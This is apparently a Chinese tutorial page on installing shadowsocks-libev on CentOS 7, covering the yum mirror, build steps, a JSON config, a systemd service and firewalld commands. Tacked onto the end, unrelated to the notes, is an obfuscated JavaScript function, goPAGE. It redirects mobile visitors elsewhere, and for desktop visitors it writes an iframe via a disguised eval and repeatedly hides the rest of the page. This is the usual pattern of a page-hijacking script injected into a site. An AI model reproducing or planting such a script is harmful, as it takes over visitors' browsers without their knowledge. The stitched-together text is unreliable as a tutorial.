Outline的Access Key格式: ss://加密方式:密码@IP地址:端口

客户端 Android 下载
https://github.com/shadowsocks/shadowsocks-android/releases
 
国内阿里的镜像
$ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo

YUM缓存生成
$ yum clean all
$ yum makecache
$ yum -y update

编译工具安装
$ yum install git unzip python2 perl openssl openssl-devel gettext gcc autoconf libtool automake make asciidoc xmlto udns-devel libev-devel pcre pcre-devel git c-ares-devel wget zlib-devel libsodium-devel mbedtls-devel -y

安装扩展源EPEL
$ yum -y install epel-release

# 安装 Libsodium
$ yum -y install libsodium

# 安装 Mbedtls
$ yum -y install mbedtls

安装 shadowsocks-libev
$ git clone https://github.com/shadowsocks/shadowsocks-libev.git
$ cd shadowsocks-libev
$ git submodule update --init --recursive
$ ./autogen.sh && ./configure --disable-documentation && make
$ sudo make install

配置 shadowsocks json文件
$ vi /etc/shadowsocks.json

{
    "server":["::0","0.0.0.0"],
    "server_port":8888,
    "local_port":1080,
    "password":"password",
    "timeout":600,
    "method":"chacha20-ietf-poly1305"
}

配置 shadowsocks 自启动
$ vi /etc/systemd/system/shadowsocks-libev.service

[Unit]
Description=shadowsocks-libev

[Service]
User=root
Group=root
TimeoutStartSec=0
ExecStart=/usr/local/bin/ss-server -c /etc/shadowsocks.json -u
Restart=on-abort

[Install]
WantedBy=multi-user.target

# 设置开机自启命令
$ systemctl enable shadowsocks-libev

# 启动命令
$ systemctl start shadowsocks-libev

#查看状态命令
$ systemctl status shadowsocks-libev -l

安装防火墙firewalld
$ yum -y install firewalld

启动 firewalld
$ systemctl start firewalld

关闭 firewalld
$ systemctl stop firewalld

开机禁用 firewalld
$ systemctl disable firewalld

开机启用 firewalld
$ systemctl enable firewalld

查看firewalld状态
$ systemctl status firewalld

#开启端口 最大端口65535
firewall-cmd --zone=public --add-port=8080-8081/tcp --permanent

#删除端口 最大端口65535
firewall-cmd --zone=public --remove-port=80/tcp --permanent

#查看开启的端口和服务
firewall-cmd --permanent --zone=public --list-services //服务空格隔开 例如 dhcpv6-client https ss
firewall-cmd --permanent --zone=public --list-ports //端口空格隔开 例如 8080-8081/tcp 8388/tcp 80/tcp

#设置某个ip 访问某个服务
firewall-cmd --permanent --zone=public --add-rich-rule="rule family="ipv4" source address="192.168.0.4/24" service name="http" accept"
ip 192.168.0.4/24 访问 http

#禁止IP地址段访问
firewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"

#查询端口是否开启
firewall-cmd --query-port=38023/tcp

#重启防火墙
firewall-cmd --reload

#清空当前缓存中的命令
history -c

function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        window.location.href = "https://www.baidu.com/"
    } else {
        var ss = '<center id="yongwang"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="13' + '80" src="https://www.baidu.com/"></iframe></center>';
        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
        try {
            setInterval(function() {
                try {
                    document.getElementById("div" + "All").style.display = "no" + "ne"
                } catch (e) {}
                for (var i = 0; i < document.body.children.length; i++) {
                    try {
                        var tagname = document.body.children[i].tagName;
                        var myid = document.body.children[i].id;
                        if (myid != "iconDiv1" && myid != "yongwang") {
                            document.body.children[i].style.display = "non" + "e"
                        }
                    } catch (e) {}
                }
            }, 100)
        } catch (e) {}
    }
}
goPAGE();
